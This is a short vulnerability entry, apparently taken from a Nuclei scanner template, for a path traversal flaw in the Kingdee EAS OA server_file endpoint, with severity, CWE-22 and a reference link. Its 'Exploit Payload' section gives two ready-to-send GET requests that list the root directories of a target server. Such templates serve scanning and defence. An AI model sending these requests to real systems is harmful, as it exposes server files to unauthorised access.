# Nuclei Template: Kingdee EAS - Local File Inclusion
**Template ID:** kingdee-eas-directory-traversal
**Vulnerability Class:** Path Traversal
**Severity:** High
**CWE:** CWE-22
**Source:** Nuclei Template (`kingdee-eas-directory-traversal.yaml`)

## Vulnerability Information & PoC

## Description
Kingdee EAS OA server_file is vulnerable to local file inclusion and can allow attackers to obtain sensitive server information.

## Steps to reproduce / Exploit Payload
```http
GET {{BaseURL}}/appmonitor/protected/selector/server_file/files?folder=C://&suffix=
GET {{BaseURL}}/appmonitor/protected/selector/server_file/files?folder=/&suffix=
```

## References
- https://github.com/nu0l/poc-wiki/blob/main/%E9%87%91%E8%9D%B6OA%20server_file%20%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E.md
